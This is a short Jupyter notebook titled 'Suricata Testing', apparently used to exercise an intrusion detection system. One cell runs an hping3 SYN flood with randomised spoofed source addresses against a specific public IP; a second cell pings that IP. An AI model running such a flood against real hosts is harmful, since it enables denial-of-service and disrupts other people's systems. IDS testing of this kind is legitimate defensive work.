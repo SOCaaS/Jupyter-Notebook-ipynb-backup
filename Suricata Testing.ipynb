{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Process is interrupted.\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source 188.166.243.236"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PING 188.166.243.236 (188.166.243.236) 56(84) bytes of data.\n",
      "64 bytes from 188.166.243.236: icmp_seq=1 ttl=53 time=161 ms\n",
      "64 bytes from 188.166.243.236: icmp_seq=2 ttl=53 time=161 ms\n",
      "64 bytes from 188.166.243.236: icmp_seq=3 ttl=53 time=161 ms\n",
      "64 bytes from 188.166.243.236: icmp_seq=4 ttl=53 time=161 ms\n",
      "\n",
      "--- 188.166.243.236 ping statistics ---\n",
      "4 packets transmitted, 4 received, 0% packet loss, time 3004ms\n",
      "rtt min/avg/max/mdev = 160.646/160.812/161.227/0.239 ms\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ping -c 4 188.166.243.236"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
